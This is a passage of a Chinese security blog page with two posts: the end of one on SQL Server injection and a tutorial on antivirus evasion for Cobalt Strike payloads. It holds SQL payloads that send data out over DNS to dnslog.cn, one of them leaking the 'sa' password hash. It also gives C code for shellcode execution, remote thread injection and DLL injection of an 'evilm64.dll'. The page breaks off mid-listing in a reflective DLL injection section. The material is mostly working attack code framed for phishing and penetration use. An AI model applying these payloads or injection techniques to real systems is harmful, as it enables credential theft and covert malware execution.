<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from fn_xe_file_target_read_file(&#39;c:\windows\win.ini&#39;,&#39;\\jtf50t.dnslog.cn\1.xem&#39;,null,null)</span><br></pre></td></tr></table></figure>

<p><img src="/2020/11/13/%E5%85%B3%E4%BA%8Esqlserver%E6%B3%A8%E5%85%A5%E5%8F%A6%E7%B1%BB%E6%8A%80%E5%B7%A7%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20201119133934287.png" alt="image-20201119133934287"></p>
<p><img src="/2020/11/13/%E5%85%B3%E4%BA%8Esqlserver%E6%B3%A8%E5%85%A5%E5%8F%A6%E7%B1%BB%E6%8A%80%E5%B7%A7%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20201119133951324.png" alt="image-20201119133951324"></p>
<p>​    我测试了报错注入和UNION下利用这种方式外带数据，都是不行的，但在where后添加EXISTS函数执行是可以的,这里有一个小坑，<strong>就是and前面的参数的内容必须是存在的，才会执行DNS请求，否则不会执行成功。</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from tn_AuditItems where DisplayOrder&#x3D;121 and exists(select * from fn_xe_file_target_read_file(&#39;\\1a.myg9zc.dnslog.cn\1.xem&#39;,&#39;1.xem&#39;,null,null))</span><br></pre></td></tr></table></figure>

<p><img src="/2020/11/13/%E5%85%B3%E4%BA%8Esqlserver%E6%B3%A8%E5%85%A5%E5%8F%A6%E7%B1%BB%E6%8A%80%E5%B7%A7%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20201119141927943.png" alt="image-20201119141927943"></p>
<p><img src="/2020/11/13/%E5%85%B3%E4%BA%8Esqlserver%E6%B3%A8%E5%85%A5%E5%8F%A6%E7%B1%BB%E6%8A%80%E5%B7%A7%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20201119141953818.png" alt="image-20201119141953818"></p>
<p>​    还有一个问题是我们如果想要利用这种方式外带数据，该怎么利用，这个语句因为出现了+号，所以在get提交时需要注意URL编码的问题。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from tn_AuditItems where DisplayOrder&#x3D;121 and exists(select * from fn_xe_file_target_read_file(&#39;\\&#39;+(SELECT TOP 1 master.dbo.fn_varbintohexstr(password_hash) FROM sys.sql_logins WHERE name&#x3D;&#39;sa&#39;)+&#39;.myg9zc.dnslog.cn\1.xem&#39;,&#39;1.xem&#39;,null,null))</span><br></pre></td></tr></table></figure>

<p><img src="/2020/11/13/%E5%85%B3%E4%BA%8Esqlserver%E6%B3%A8%E5%85%A5%E5%8F%A6%E7%B1%BB%E6%8A%80%E5%B7%A7%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20201119142531471.png" alt="image-20201119142531471"></p>
<p><img src="/2020/11/13/%E5%85%B3%E4%BA%8Esqlserver%E6%B3%A8%E5%85%A5%E5%8F%A6%E7%B1%BB%E6%8A%80%E5%B7%A7%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20201119142548412.png" alt="image-20201119142548412"></p>
<p>​        和fn_xe_file_target_read_file类似的函数还有fn_get_audit_file，</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from fn_get_audit_file(&#39;\\zwbqeg.dnslog.cn\11.xxx&#39;,default,default)</span><br></pre></td></tr></table></figure>

<p><img src="/2020/11/13/%E5%85%B3%E4%BA%8Esqlserver%E6%B3%A8%E5%85%A5%E5%8F%A6%E7%B1%BB%E6%8A%80%E5%B7%A7%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20201119142900030.png" alt="image-20201119142900030"></p>
<p><img src="/2020/11/13/%E5%85%B3%E4%BA%8Esqlserver%E6%B3%A8%E5%85%A5%E5%8F%A6%E7%B1%BB%E6%8A%80%E5%B7%A7%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20201119142908659.png" alt="image-20201119142908659"></p>
<p>​    作者还提供了fn_trace_gettable函数，不过这种利用方式我并没有复现成功。</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>​    对于该作者挖掘到这些关于注入利用的函数，我们肯定也在想他是如何找到这些函数的，这里我大致做一下分析。</p>
<p><strong>报错注入函数</strong></p>
<p>​    我查阅了一些资料，这些函数都有一些共同点，就是接收的参数是int型的参数，并且返回值是varchar类型，如果我们想要挖掘其他的可以报错的函数，可以寻找这种类型的函数。</p>
<p><strong>DNS注入函数</strong></p>
<p>​    DNS外带数据的函数也比较明显，就是他们都是文件操作的函数，也就是说会进行文件读取操作的函数，那如果给这些函数的参数传入UNC路径的内容，就可能会存在DNS请求。</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

        
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="cn">
    <link itemprop="mainEntityOfPage" href="https://cangqingzhe.github.io/2020/11/09/%E5%85%B3%E4%BA%8E%E5%85%8D%E6%9D%80%E7%9A%84%E6%8A%80%E6%9C%AF%E6%80%BB%E7%BB%93%EF%BC%88-%EF%BC%89/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="藏青">
      <meta itemprop="description" content="知行合一">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="藏青's BLOG">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          
            <a href="/2020/11/09/%E5%85%B3%E4%BA%8E%E5%85%8D%E6%9D%80%E7%9A%84%E6%8A%80%E6%9C%AF%E6%80%BB%E7%BB%93%EF%BC%88-%EF%BC%89/" class="post-title-link" itemprop="url">关于免杀的技术总结（-）</a>
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2020-11-09 20:26:00" itemprop="dateCreated datePublished" datetime="2020-11-09T20:26:00+08:00">2020-11-09</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2020-11-11 19:36:50" itemprop="dateModified" datetime="2020-11-11T19:36:50+08:00">2020-11-11</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E5%85%8D%E6%9D%80/" itemprop="url" rel="index">
                    <span itemprop="name">免杀</span>
                  </a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>​    在钓鱼或者渗透的过程中，如果我们不会免杀，使用Cobaltstrike生成的exe可能直接就被干掉了，还会触发目标的告警，导致之前的工作前功尽弃，因此在往更高阶的攻防对抗中，免杀能力是必不可少的能力，不是说每个人都必须掌握这种能力，但是如果一个团队中，一个会免杀的人都没有，那就很僵了。</p>
<p>​    回到正题，本片文章并不会讲到免杀方法可能很多已经都不可用了，之所以写这篇总结文章，是希望大家能对免杀的方法能有一个系统的认知。</p>
<h2 id="远程线程调用"><a href="#远程线程调用" class="headerlink" title="远程线程调用"></a>远程线程调用</h2><p>​    要讲远程线程调用，我们首先看一下本地的调用，代码如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">#include &quot;stdafx.h&quot;</span><br><span class="line">#include &quot;Windows.h&quot;</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">	unsigned char shellcode[] &#x3D;&quot;shellcode&quot;;</span><br><span class="line">	void *exec &#x3D; VirtualAlloc(0, sizeof shellcode, MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class="line">	memcpy(exec, shellcode, sizeof shellcode);</span><br><span class="line">	((void(*)())exec)();</span><br><span class="line"></span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​    上面的代码中用到了几个函数，我大致讲一下：</p>
<p><strong>VirtualAlloc</strong></p>
<p>​    VirtualAlloc函数通常可以用来分配大块的指定大小的内存，它包含如下参数</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">参数一：要分配的内存区域的地址</span><br><span class="line">参数二：要分配的大小</span><br><span class="line">参数三：要分配的类型 当使用MEM_COMMIT时，代表分配物理内存，并初始化为0，</span><br><span class="line">参数四：内存的初始保护属性 当设置为PAGE_EXECUTE时，代表这个区域的代码可执行，但不可读写。</span><br></pre></td></tr></table></figure>

<p>​    也就是当我们执行VirtualAlloc(0, sizeof shellcode, MEM_COMMIT, PAGE_EXECUTE_READWRITE)时，就会给我们分配大小为sizeof shellcode大小的内存块，并且初始化为0，并且该内存具有执行权限。</p>
<p>​    我做了一个测试，下面执行后我们分配的地址是0x009e0000</p>
<p><img src="/2020/11/09/%E5%85%B3%E4%BA%8E%E5%85%8D%E6%9D%80%E7%9A%84%E6%8A%80%E6%9C%AF%E6%80%BB%E7%BB%93%EF%BC%88-%EF%BC%89/image-20201109204919240.png" alt="image-20201109204919240"></p>
<p>​    我们查看这个地址，可以看到这个地址确实被分配了一大块的内存，并且内容为空。</p>
<p><img src="/2020/11/09/%E5%85%B3%E4%BA%8E%E5%85%8D%E6%9D%80%E7%9A%84%E6%8A%80%E6%9C%AF%E6%80%BB%E7%BB%93%EF%BC%88-%EF%BC%89/image-20201109205007124.png" alt="image-20201109205007124"></p>
<p><strong>memcpy</strong></p>
<p>​    memcpy用来从str2中赋值n个字节数据到str1中。其中str1和str2的类型为指针类型。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">void *memcpy(void *str1, const void *str2, size_t n)</span><br></pre></td></tr></table></figure>

<p>​    知道了这个以后，我们就可以知道，当执行memcpy(exec, shellcode, sizeof shellcode) 时，会将长度为sizeof shellcode内容为shellcode的内容复制到exec这个指针所指的位置。</p>
<p>​    shellcode指针指向的地址为0x005cfadc，地址内容如下：</p>
<p><img src="/2020/11/09/%E5%85%B3%E4%BA%8E%E5%85%8D%E6%9D%80%E7%9A%84%E6%8A%80%E6%9C%AF%E6%80%BB%E7%BB%93%EF%BC%88-%EF%BC%89/image-20201109205508511.png" alt="image-20201109205508511"></p>
<p>​    当执行完memcpy后，我们可以看到，将0x005cfadc内存中的部分数据拷贝到了0x009e0000内存中。</p>
<p><img src="/2020/11/09/%E5%85%B3%E4%BA%8E%E5%85%8D%E6%9D%80%E7%9A%84%E6%8A%80%E6%9C%AF%E6%80%BB%E7%BB%93%EF%BC%88-%EF%BC%89/image-20201109205618924.png" alt="image-20201109205618924"></p>
<p>​    最后我们再看下((void(*)())exec)()大致的意思是将exec这个指针强制转换为函数指针，然后调用这个函数，最终我们的代码得到了执行。</p>
<p>​    我们再来看一下远程线程注入的代码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">#include &quot;Windows.h&quot;</span><br><span class="line"></span><br><span class="line">int main(int argc, char* argv[])</span><br><span class="line">&#123;</span><br><span class="line">	unsigned char shellcode[] &#x3D;&quot;shellcode&quot;;</span><br><span class="line">	HANDLE processHandle;</span><br><span class="line">	HANDLE remoteThread;</span><br><span class="line">	PVOID remoteBuffer;</span><br><span class="line">	printf(&quot;Injecting to PID: %i&quot;, atoi(argv[1]));</span><br><span class="line">	processHandle &#x3D; OpenProcess(PROCESS_ALL_ACCESS, FALSE, DWORD(atoi(argv[1])));</span><br><span class="line">	remoteBuffer &#x3D; VirtualAllocEx(processHandle, NULL, sizeof shellcode, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);</span><br><span class="line">	WriteProcessMemory(processHandle, remoteBuffer, shellcode, sizeof shellcode, NULL);</span><br><span class="line">	remoteThread &#x3D; CreateRemoteThread(processHandle, NULL, 0, (LPTHREAD_START_ROUTINE)remoteBuffer, NULL, 0, NULL);</span><br><span class="line">	CloseHandle(processHandle);</span><br><span class="line">	return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​    在上面的代码中，同样调用了几个windows函数，想要理解上面的代码做了什么，首先需要了解这几个windows 函数的功能。</p>
<p><strong>OpenProcess</strong></p>
<p>​    OpenProcess用来打开一个已经存在的进程对象，并返回进程的句柄，这个函数的原型如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">HANDLE OpenProcess(</span><br><span class="line">DWORD dwDesiredAccess, &#x2F;&#x2F;访问权限（标志）</span><br><span class="line">BOOL bInheritHandle, &#x2F;&#x2F; 是否继承句柄</span><br><span class="line">DWORD dwProcessId&#x2F;&#x2F; 进程标示符</span><br><span class="line">);</span><br></pre></td></tr></table></figure>

<p>dwDesiredAccess代表获取的访问权限，PROCESS_ALL_ACCESS代表获取所有权限。bInheritHandle代表是否继承句柄为boolean类型，dwProcessId代表进程的id。penProcess(PROCESS_ALL_ACCESS, FALSE, DWORD(atoi(argv[1])))的意思就是获取进程id为argv[1]的进程对象的所有的权限，并返回进程的句柄。</p>
<p><strong>VirtualAllocEx</strong></p>
<p>​    通过这个函数，我们可以在我们获取的进程对象中分配内存。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">LPVOID VirtualAllocEx(</span><br><span class="line">  HANDLE hProcess,&#x2F;&#x2F;我们想要分配内存的进程</span><br><span class="line">  LPVOID lpAddress,&#x2F;&#x2F;受害者进程内存中指定地址的指针</span><br><span class="line">  SIZE_T dwSize,&#x2F;&#x2F;分配的内存区域的大小</span><br><span class="line">  DWORD  flAllocationType,&#x2F;&#x2F;指定要分配的内存类型</span><br><span class="line">  DWORD  flProtect&#x2F;&#x2F;它指定分配的内存保护,我们将其设置为PAGE_EXECUTE_READWRITE。</span><br><span class="line">);</span><br></pre></td></tr></table></figure>

<p>​    通过执行VirtualAllocEx(processHandle, NULL, sizeof shellcode, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE)，我们可以在processHandle指向的进程中分配一块内存，并且设置内存为可执行权限，当函数执行成功，则返回分配内存的首地址，不成功则返回null。当我们执行完内存分配后remoteBuffer中会有一个地址，但是这个地址并不是我们当前进程的地址，而是notepad的地址。</p>
<p><img src="/2020/11/09/%E5%85%B3%E4%BA%8E%E5%85%8D%E6%9D%80%E7%9A%84%E6%8A%80%E6%9C%AF%E6%80%BB%E7%BB%93%EF%BC%88-%EF%BC%89/image-20201110105814469.png" alt="image-20201110105814469"></p>
<p>​    我们使用hxd来查看这个地址的内容</p>
<p><img src="/2020/11/09/%E5%85%B3%E4%BA%8E%E5%85%8D%E6%9D%80%E7%9A%84%E6%8A%80%E6%9C%AF%E6%80%BB%E7%BB%93%EF%BC%88-%EF%BC%89/image-20201110105919797.png" alt="image-20201110105919797"></p>
<p><strong>WriteProcessMemory</strong></p>
<p>​    <code>WriteProcessMemory</code>是一个将数据写入指定进程的内存区域的函数。需要注意的是整个内存区域必须是可写的，否则会失败。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">BOOL WriteProcessMemory(</span><br><span class="line">      HANDLE  hProcess,&#x2F;&#x2F;我们想要写入数据的进程</span><br><span class="line">  LPVOID  lpBaseAddress,&#x2F;&#x2F;我们想要写入数据的地址</span><br><span class="line">  LPCVOID lpBuffer,&#x2F;&#x2F;指向必须写入的数据的指针</span><br><span class="line">  SIZE_T  nSize,&#x2F;&#x2F;写入的数据量</span><br><span class="line">  SIZE_T  *lpNumberOfBytesWritten&#x2F;&#x2F;指向SIZE_T的指针，它将存储写入该目标的字节数。</span><br><span class="line">);</span><br></pre></td></tr></table></figure>

<p>​    按照上面的理解，当我们执行完WriteProcessMemory(processHandle, remoteBuffer, shellcode, sizeof shellcode, NULL)后，会在processHandle进程中开辟的空间remoteBuffer中写入大小为sizeof shellcode,内容为shellcode的数据。调用后成功将shellcode写入到notepad的内存中</p>
<p><img src="/2020/11/09/%E5%85%B3%E4%BA%8E%E5%85%8D%E6%9D%80%E7%9A%84%E6%8A%80%E6%9C%AF%E6%80%BB%E7%BB%93%EF%BC%88-%EF%BC%89/image-20201110110155310.png" alt="image-20201110110155310"></p>
<p><strong>CreateRemoteThread</strong></p>
<p>​    CreateRemoteThread在另一个进程的虚拟空间中创建一个线程。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">HANDLE CreateRemoteThread(</span><br><span class="line">  HANDLE                 hProcess,&#x2F;&#x2F; 目标进程句柄</span><br><span class="line">  LPSECURITY_ATTRIBUTES  lpThreadAttributes,&#x2F;&#x2F; 安全属性</span><br><span class="line">  SIZE_T                 dwStackSize, &#x2F;&#x2F; 进程堆栈大小</span><br><span class="line">  LPTHREAD_START_ROUTINE lpStartAddress,  &#x2F;&#x2F; 进程函数</span><br><span class="line">  LPVOID                 lpParameter, &#x2F;&#x2F; 进程参数</span><br><span class="line">  DWORD                  dwCreationFlags, &#x2F;&#x2F; 创建标志</span><br><span class="line">  LPDWORD                lpThreadId &#x2F;&#x2F; 参数返回ID</span><br><span class="line">);</span><br></pre></td></tr></table></figure>

<p>​    当执行下面的操作时，则会执行remoteBuffer指向的内容。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CreateRemoteThread(processHandle, NULL, 0, (LPTHREAD_START_ROUTINE)remoteBuffer, NULL, 0, NULL);</span><br></pre></td></tr></table></figure>

<p>​    最后调用CreateRemoteThread,成功上线，但是这里有一个问题，因为我们现在使用windows创建的notepad为64位，所以我们要编译的这个exe也应该是64位，否则调用CreateRemoteThread会返回0调用失败。</p>
<p><img src="/2020/11/09/%E5%85%B3%E4%BA%8E%E5%85%8D%E6%9D%80%E7%9A%84%E6%8A%80%E6%9C%AF%E6%80%BB%E7%BB%93%EF%BC%88-%EF%BC%89/image-20201110110250322.png" alt="image-20201110110250322"></p>
<p><img src="/2020/11/09/%E5%85%B3%E4%BA%8E%E5%85%8D%E6%9D%80%E7%9A%84%E6%8A%80%E6%9C%AF%E6%80%BB%E7%BB%93%EF%BC%88-%EF%BC%89/image-20201110110331437.png" alt="image-20201110110331437"></p>
<h2 id="DLL注入"><a href="#DLL注入" class="headerlink" title="DLL注入"></a>DLL注入</h2><p>​    首先给出DLL注入的代码，如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">int main(int argc, char* argv[]) &#123;</span><br><span class="line">	HANDLE processHandle;</span><br><span class="line">	PVOID remoteBuffer;</span><br><span class="line">	wchar_t dllPath[] &#x3D; TEXT(&quot;C:\\experiments\\evilm64.dll&quot;);</span><br><span class="line"></span><br><span class="line">	printf(&quot;Injecting DLL to PID: %i\n&quot;, atoi(argv[1]));</span><br><span class="line">	processHandle &#x3D; OpenProcess(PROCESS_ALL_ACCESS, FALSE, DWORD(atoi(argv[1])));</span><br><span class="line">	remoteBuffer &#x3D; VirtualAllocEx(processHandle, NULL, sizeof dllPath, MEM_COMMIT, PAGE_READWRITE);</span><br><span class="line">	WriteProcessMemory(processHandle, remoteBuffer, (LPVOID)dllPath, sizeof dllPath, NULL);</span><br><span class="line">	PTHREAD_START_ROUTINE threatStartRoutineAddress &#x3D; (PTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandle(TEXT(&quot;Kernel32&quot;)), &quot;LoadLibraryW&quot;);</span><br><span class="line">	CreateRemoteThread(processHandle, NULL, 0, threatStartRoutineAddress, remoteBuffer, 0, NULL);</span><br><span class="line">	CloseHandle(processHandle);</span><br><span class="line">	return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​    通过查看上面的代码，我们可以看出上面的代码和远程线程调用的代码类似，不同的是将shellcode数组的地址转换为dll的路径。还有就是调用了GetProcAddress这个函数，我们先了解一下这个函数。</p>
<p><strong>GetProcAddress</strong></p>
<p>​    GetProcAddress是一个计算机函数，功能是检索指定的动态链接库(DLL)中的输出<a href="https://baike.baidu.com/item/库函数/3471322" target="_blank" rel="noopener">库函数</a>地址。lpProcName参数能够识别DLL中的函数。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">FARPROC GetProcAddress(</span><br><span class="line">HMODULE hModule, &#x2F;&#x2F; DLL模块句柄</span><br><span class="line">LPCSTR lpProcName &#x2F;&#x2F; 函数名</span><br><span class="line">);</span><br></pre></td></tr></table></figure>

<p>​    然后我们再来理解一下GetProcAddress(GetModuleHandle(TEXT(“Kernel32”)), “LoadLibraryW”);也就是获取LoadLibraryW函数的地址，LoadLibraryW函数的功能可以加载指定路径的DLL文件。之所以没有直接调用LoadLibraryW函数，是因为这个函数不能直接调用，只能查找这个函数名称所在的内存地址进行调用。</p>
<p>​    所以使用DLL注入的过程大概是这样的</p>
<ul>
<li><p>OpenProcess 找到我们想要注入进程的句柄，获取权限</p>
</li>
<li><p>VirtualAllocEx 分配内存，用来存放我们DLL的路径</p>
</li>
<li><p>WriteProcessMemory 将DLL的路径写入分配的内存</p>
</li>
<li><p>GetProcAddress 获取LoadLibraryW这个库函数的地址</p>
</li>
<li><p>CreateRemoteThread 使用LoadLibraryW加载DLL执行</p>
<p>我们调试一下，看和我们分析的结果是否相同，首先在执行完VirtualAllocEx 会分配一块内存</p>
</li>
</ul>
<p><img src="/2020/11/09/%E5%85%B3%E4%BA%8E%E5%85%8D%E6%9D%80%E7%9A%84%E6%8A%80%E6%9C%AF%E6%80%BB%E7%BB%93%EF%BC%88-%EF%BC%89/image-20201110151824300.png" alt="image-20201110151824300"></p>
<p>​    我们使用HXD找到这块内存，看是否分配成功，如下所示：</p>
<p><img src="/2020/11/09/%E5%85%B3%E4%BA%8E%E5%85%8D%E6%9D%80%E7%9A%84%E6%8A%80%E6%9C%AF%E6%80%BB%E7%BB%93%EF%BC%88-%EF%BC%89/image-20201110151807657.png" alt="image-20201110151807657"></p>
<p>​    再继续执行，WriteProcessMemory函数执行后，会再该内存写入我们DLL的地址</p>
<p><img src="/2020/11/09/%E5%85%B3%E4%BA%8E%E5%85%8D%E6%9D%80%E7%9A%84%E6%8A%80%E6%9C%AF%E6%80%BB%E7%BB%93%EF%BC%88-%EF%BC%89/image-20201110151957686.png" alt="image-20201110151957686"></p>
<p>​    最后，当我们调用CreateRemoteThread后，成功上线。</p>
<p><img src="/2020/11/09/%E5%85%B3%E4%BA%8E%E5%85%8D%E6%9D%80%E7%9A%84%E6%8A%80%E6%9C%AF%E6%80%BB%E7%BB%93%EF%BC%88-%EF%BC%89/image-20201110152028142.png" alt="image-20201110152028142"></p>
<p><img src="/2020/11/09/%E5%85%B3%E4%BA%8E%E5%85%8D%E6%9D%80%E7%9A%84%E6%8A%80%E6%9C%AF%E6%80%BB%E7%BB%93%EF%BC%88-%EF%BC%89/image-20201110152054110.png" alt="image-20201110152054110"></p>
<h2 id="反射DLL注入"><a href="#反射DLL注入" class="headerlink" title="反射DLL注入"></a>反射DLL注入</h2><p>​    上面我们演示的DLL注入技术有一个很明显的缺陷，那就是必须让我们的DLL在目标的硬盘上，直接将我们恶意的DLL放到硬盘中，无疑加大了被查杀的风险，因此下来我们来了解一下不落地执行DLL的方法，那就是反射DLL注入技术，它允许我们从内存中向受害者进程注入DLL。</p>
<p>​    我们先看一下简单的反射DLL的栗子，首先使用vs创建一个DLL项目，代码如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">#include &quot;stdafx.h&quot;</span><br><span class="line">#include &quot;pch.h&quot;</span><br><span class="line">BOOL APIENTRY DllMain(HMODULE hModule,</span><br><span class="line">    DWORD  ul_reason_for_call,</span><br><span class="line">    LPVOID lpReserved</span><br><span class="line">)</span><br><span class="line">&#123;</span><br><span class="line">    switch (ul_reason_for_call)</span><br><span class="line">    &#123;</span><br><span class="line">    case DLL_PROCESS_ATTACH:</span><br><span class="line">    &#123;</span><br><span class="line">        MessageBoxA(NULL, &quot;注入成功!&quot;, &quot;提示&quot;, MB_OK);</span><br><span class="line">    &#125;</span><br><span class="line">    case DLL_THREAD_ATTACH:</span><br><span class="line">    case DLL_THREAD_DETACH:</span><br><span class="line">    case DLL_PROCESS_DETACH:</span><br><span class="line">        break;</span><br><span class="line">    &#125;</span><br><span class="line">    return TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​    上面的代码内容比较简单，当调用这个DLL时，会弹出一个框提示注入成功，重点在下面的代码。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span 